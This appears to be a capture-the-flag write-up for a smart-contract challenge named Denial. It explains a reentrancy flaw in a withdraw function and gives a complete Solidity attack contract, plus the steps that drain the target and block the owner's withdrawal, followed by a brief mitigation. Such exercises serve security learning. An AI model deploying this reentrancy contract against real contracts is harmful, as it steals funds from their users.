## Objectives

1. Prevent the owner from calling `withdraw` even when the contract has a positive balance.

## Vulnerabilities

### Reentrancy

The withdraw function is vulnerable to reentrancy attacks. A timelock logic seems to be started
but not implemented completely. We can exploit this fact by making a _hack_ contract become a
withdraw partner.

## Exploit

1. Write and deploy a hacking contract like the following:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IDenial {
    function setWithdrawPartner(address) external;
    function withdraw() external;
    function contractBalance() external returns(uint);
}

contract DenialHack {
    IDenial target;

    constructor(address payable _targetAddress) {
        target = IDenial(_targetAddress);
    }

    receive() external payable {
        if(address(target).balance > 0){
            target.withdraw();
        } else {}
    }
}
```

2. Call `setWithdrawPartner` with the hacking contract's address as argument.

3. When the owner call withdraw, he will not receive any of it's eth.

## Suggested mitigation

1. Completing the timelock logic to one withdraw per hour, per day or whatever else increment of time would prevent this issue from happening.
